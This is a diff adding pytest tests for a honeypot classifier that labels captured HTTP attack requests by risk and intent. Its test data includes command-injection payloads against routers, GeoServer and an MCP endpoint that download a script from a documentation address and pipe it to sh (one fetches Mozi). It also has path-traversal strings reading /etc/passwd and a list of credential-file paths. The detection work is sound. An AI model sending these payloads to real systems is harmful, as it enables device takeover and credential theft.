@@ -535,3 +535,228 @@ def test_system_binary_read_over_telnet_does_not_match_the_ssh_rule():
     summary = classify_session(session)
 
     assert "ssh_system_binary_read" not in summary.matched_rule_ids
+
+
+# Request shapes below follow what the public sensor captured, with the
+# download addresses replaced by documentation addresses.
+@pytest.mark.parametrize(
+    "lines",
+    [
+        [
+            "POST /goform/set_LimitClient_cfg HTTP/1.1",
+            "POST /goform/set_LimitClient_cfg: time1=00:00-00:00&time2=00:00-00:00"
+            "&mac=;wget http://198.51.100.7/ok; chmod 777 ok; sh ok; rm -rf ok",
+        ],
+        [
+            "POST /goform/set_LimitClient_cfg HTTP/1.1",
+            "POST /goform/set_LimitClient_cfg: time1=00:00-00:00"
+            "&mac=%3Bwget%20-qO-%20http%3A%2F%2F198.51.100.7%2Fx.sh%7Csh%26%23",
+        ],
+        [
+            "POST /tmUnblock.cgi HTTP/1.1",
+            "POST /tmUnblock.cgi: ttcp_ip=-h+%60busybox+wget+-qO-+http%3A%2F%2F198.51.100.7"
+            "%2Fx.sh%7Csh%60&StartEPI=1",
+        ],
+        [
+            "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+"
+            "http://198.51.100.7:8080/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/ HTTP/1.0",
+        ],
+        [
+            "GET /geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue"
+            "&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),%27id%27) HTTP/1.1",
+        ],
+        [
+            "POST /api/mcp/connect HTTP/1.1",
+            'POST /api/mcp/connect: {"serverConfig":{"command":"sh","args":["-c",'
+            '"(wget -qO- https://198.51.100.7/sh || curl -sk https://198.51.100.7/sh) | sh"]}}',
+        ],
+    ],
+)
+def test_http_command_injection_is_high_risk_payload_delivery(lines):
+    session = make_session(
+        "http",
+        [(line, 0.0) for line in lines],
+        duration_seconds=0.1,
+        persona_id="ubuntu_web_server",
+    )
+
+    summary = classify_session(session)
+
+    assert "http_command_injection" in summary.matched_rule_ids
+    assert summary.actor_label == "commodity_bot"
+    assert summary.risk_level == "high"
+    assert summary.mitre_tags[0] == "T1190"
+    assert summary.intent == "payload_delivery"
+    # The check rules stay quiet when the request carries the exploit
+    assert "http_geoserver_probe" not in summary.matched_rule_ids
+    assert "http_ai_server_probe" not in summary.matched_rule_ids
+
+
+@pytest.mark.parametrize(
+    "lines",
+    [
+        ["GET / HTTP/1.1", "User-Agent: curl/8.5.0"],
+        ["GET /search?q=wget+tutorial HTTP/1.1"],
+        ["GET /?tool=curl&x=1 HTTP/1.1"],
+        ["POST /contact: message=I+use+curl+and+wget+daily"],
+    ],
+)
+def test_download_tool_names_without_injection_do_not_match(lines):
+    session = make_session(
+        "http",
+        [(line, 0.0) for line in lines],
+        duration_seconds=0.1,
+        persona_id="ubuntu_web_server",
+    )
+
+    summary = classify_session(session)
+
+    assert "http_command_injection" not in summary.matched_rule_ids
+
+
+@pytest.mark.parametrize(
+    "request_line",
+    [
+        "GET /..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1",
+        "GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts HTTP/1.1",
+        "GET /static/..%252f..%252f..%252fetc/passwd HTTP/1.1",
+    ],
+)
+def test_http_path_traversal_is_named_as_exploitation(request_line):
+    session = make_session(
+        "http",
+        [(request_line, 0.0)],
+        duration_seconds=0.1,
+        persona_id="ubuntu_web_server",
+    )
+
+    summary = classify_session(session)
+
+    assert "http_path_traversal" in summary.matched_rule_ids
+    # One finding for the request, not a secret-file search as well
+    assert "http_sensitive_path_probe" not in summary.matched_rule_ids
+    assert summary.actor_label == "automated_scanner"
+    assert summary.risk_level == "medium"
+    assert summary.intent == "vulnerability_exploitation"
+
+
+def test_single_parent_folder_step_is_not_path_traversal():
+    session = make_session(
+        "http",
+        [("GET /../logon/logon.htm HTTP/1.1", 0.0)],
+        duration_seconds=0.1,
+        persona_id="ubuntu_web_server",
+    )
+
+    summary = classify_session(session)
+
+    assert "http_path_traversal" not in summary.matched_rule_ids
+
+
+@pytest.mark.parametrize(
+    "request_line",
+    [
+        "CONNECT example.com:443 HTTP/1.1",
+        "GET http://example.com/judge HTTP/1.1",
+    ],
+)
+def test_http_open_proxy_probe(request_line):
+    session = make_session(
+        "http",
+        [(request_line, 0.0)],
+        duration_seconds=0.1,
+        persona_id="ubuntu_web_server",
+    )
+
+    summary = classify_session(session)
+
+    assert "http_open_proxy_probe" in summary.matched_rule_ids
+    assert summary.mitre_tags == ["T1090"]
+    assert summary.intent == "reconnaissance"
+
+
+@pytest.mark.parametrize(
+    "request_line, rule_id, technique",
+    [
+        ("GET /SDK/webLanguage HTTP/1.1", "http_hikvision_camera_probe", "T1595.002"),
+        ("GET /geoserver/web/ HTTP/1.1", "http_geoserver_probe", "T1595.002"),
+        ("GET /mcp HTTP/1.1", "http_ai_server_probe", "T1595.002"),
+        ("GET /api/mcp HTTP/1.1", "http_ai_server_probe", "T1595.002"),
+        ("GET /sse HTTP/1.1", "http_ai_server_probe", "T1595.002"),
+        ("GET /v1/models HTTP/1.1", "http_ai_server_probe", "T1595.002"),
+        ("POST /wsman HTTP/1.1", "http_winrm_probe", "T1592"),
+    ],
+)
+def test_http_product_checks_are_low_risk_reconnaissance(request_line, rule_id, technique):
+    session = make_session(
+        "http",
+        [(request_line, 0.0)],
+        duration_seconds=0.1,
+        persona_id="ubuntu_web_server",
+    )
+
+    summary = classify_session(session)
+
+    assert rule_id in summary.matched_rule_ids
+    assert summary.actor_label == "automated_scanner"
+    assert summary.mitre_tags[0] == technique
+    assert summary.risk_level == "low"
+    assert summary.intent == "reconnaissance"
+
+
+@pytest.mark.parametrize(
+    "request_line",
+    ["GET /mcpanel HTTP/1.1", "GET /geoservers HTTP/1.1", "GET /sdk HTTP/1.1"],
+)
+def test_lookalike_paths_are_not_product_checks(request_line):
+    session = make_session(
+        "http",
+        [(request_line, 0.0)],
+        duration_seconds=0.1,
+        persona_id="ubuntu_web_server",
+    )
+
+    summary = classify_session(session)
+
+    assert not {
+        "http_hikvision_camera_probe",
+        "http_geoserver_probe",
+        "http_ai_server_probe",
+    } & set(summary.matched_rule_ids)
+
+
+@pytest.mark.parametrize("scheme", ["NTLM", "Negotiate"])
+def test_password_less_windows_signin_is_a_host_information_probe(scheme):
+    session = make_session(
+        "http",
+        [
+            ("GET / HTTP/1.1", 0.0),
+            (f"Authorization: {scheme} TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAAAAAA", 0.0),
+        ],
+        duration_seconds=0.1,
+        persona_id="ubuntu_web_server",
+    )
+
+    summary = classify_session(session)
+
+    assert "http_windows_signin_probe" in summary.matched_rule_ids
+    assert summary.mitre_tags == ["T1592"]
+    assert summary.intent == "reconnaissance"
+
+
+@pytest.mark.parametrize(
+    "path",
+    ["/.aws/credentials", "/config.json", "/.git-credentials", "/terraform.tfstate",
+     "/actuator/env", "/appsettings.json", "/docker-compose.yml", "/secrets.json"],
+)
+def test_http_secret_file_requests_match_the_sensitive_path_rule(path):
+    session = make_session(
+        "http",
+        [(f"GET {path} HTTP/1.1", 0.0)],
+        duration_seconds=0.1,
+        persona_id="ubuntu_web_server",
+    )
+
+    summary = classify_session(session)
+
+    assert "http_sensitive_path_probe" in summary.matched_rule_ids
